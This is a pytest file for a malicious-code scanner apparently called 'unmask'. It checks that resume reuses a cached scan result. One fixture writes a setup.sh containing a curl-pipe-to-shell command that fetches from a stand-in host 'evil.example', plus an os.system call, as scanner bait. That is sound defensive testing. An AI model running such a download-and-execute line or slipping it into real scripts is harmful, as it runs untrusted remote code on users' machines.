"""Resume reuses the cached observe() output instead of re-scanning.

`unmask resume` re-drives the whole graph, but the observe pass (the base source scan
and, above all, the transform fixpoint's re-scan of recovered code) is the run's cost
centre and is deterministic. `ScanAndCompose`/`ProcessTransforms` snapshot it to a
run-dir artifact and reload it on resume; compose stays fresh. The cache is best-effort:
any (de)serialization problem falls back to a fresh observe, so resume can never be less
correct than a from-scratch run — these tests pin both the reuse and that guarantee.
"""

from __future__ import annotations

from pathlib import Path

from unmask import MCDConfig, run_mcd


# --- unit: the cache round-trips raw Observations + inventory losslessly --------------

def test_scan_cache_roundtrips_observations_and_inventory(tmp_path):
    from unmask.graph.nodes import _load_scan_cache, _save_scan_cache
    from unmask.scanner.observe.atoms import Observation
    from unmask.scanner.observe.inventory import FileEntry, Inventory

    obs = [
        Observation(atom="EXEC.SHELL", confidence=0.85, method="source-callee",
                    path="a.py", line=3, rule_id="r1", evidence="os.system(x)",
                    summary="shell exec", relationships=[{"kind": "flows", "to": "sink"}],
                    id="obs-1"),
        Observation(atom="NETW.HTTP", confidence=0.4, method="content-regex",
                    path="s.sh", line=None),
    ]
    inv = Inventory(
        root="/t",
        files=[FileEntry(path="/t/a.py", rel="a.py", kind="source",
                         language="python", ecosystem="pypi", size=42)],
        purpose="a demo pkg", dataflow={"a.py": [{"src": "u", "sink": "v"}]},
        reachability={"reachableSinks": ["a.py:3"]})
    p = tmp_path / "c.json"
    _save_scan_cache(p, obs, inv, extra={"transformed": ["x.so"], "notes": []})

    ro, ri, extra = _load_scan_cache(p)
    assert [o.atom for o in ro] == ["EXEC.SHELL", "NETW.HTTP"]
    assert ro[0].line == 3 and ro[0].summary == "shell exec" and ro[0].id == "obs-1"
    assert ro[0].relationships == [{"kind": "flows", "to": "sink"}]
    assert ro[1].line is None and ro[1].confidence == 0.4      # None + non-1.0 survive
    assert ri.root == "/t" and ri.purpose == "a demo pkg"
    assert len(ri.files) == 1 and ri.files[0].rel == "a.py" and ri.files[0].size == 42
    assert ri.files[0].language == "python"
    assert ri.dataflow == {"a.py": [{"src": "u", "sink": "v"}]}
    assert ri.reachability == {"reachableSinks": ["a.py:3"]}
    assert extra == {"transformed": ["x.so"], "notes": []}
    assert ri.source_files()[0].rel == "a.py"                  # methods work post-reload


def test_scan_cache_save_never_raises_and_missing_is_none(tmp_path):
    from unmask.graph.nodes import _load_scan_cache, _save_scan_cache
    from unmask.scanner.observe.atoms import Observation
    from unmask.scanner.observe.inventory import Inventory

    assert _load_scan_cache(tmp_path / "nope.json") is None    # absent → caller re-observes

    class Weird:  # not JSON-serializable
        pass

    obs = [Observation(atom="X", confidence=1.0, method="m", path="p",
                       relationships=[{"bad": Weird()}])]
    p = tmp_path / "c.json"
    _save_scan_cache(p, obs, Inventory(root="/t"))             # must not raise
    assert _load_scan_cache(p) is None                         # no half-written cache to trust


# --- integration: a real run writes the cache; resume reuses it and matches ------------

def test_resume_reuses_observe_cache_and_matches(tmp_path, monkeypatch):
    from unmask import resume_mcd
    import unmask.scanner.native as nativemod

    tgt = tmp_path / "pkg"
    tgt.mkdir()
    # Source-only (no binary artifacts → no transform fixpoint), so the ONLY observe()
    # call is ScanAndCompose's — which resume must serve from the cache.
    (tgt / "setup.sh").write_text("#!/bin/sh\ncurl -fsSL http://evil.example/x | sh\n")
    (tgt / "a.py").write_text("import os\nos.system('id')\n")
    cfg = MCDConfig(storage_root=str(tmp_path / ".mcd"))

    first = run_mcd(str(tgt), cfg)
    cache = Path(first.run_dir) / "artifacts" / "scan" / "observe-cache.json"
    assert cache.is_file(), "a fresh run must write the observe cache"

    # After this point, any observe() call means resume re-scanned — which it must not.
    real_observe = nativemod.NativeScanner.observe
    calls = {"n": 0}

    def counting_observe(self, *a, **k):
        calls["n"] += 1
        return real_observe(self, *a, **k)

    monkeypatch.setattr(nativemod.NativeScanner, "observe", counting_observe)

    second = resume_mcd(first.run_dir)
    assert calls["n"] == 0, "resume must reuse the observe cache, not re-scan"
    assert second.finding_count == first.finding_count
    assert second.disposition == first.disposition
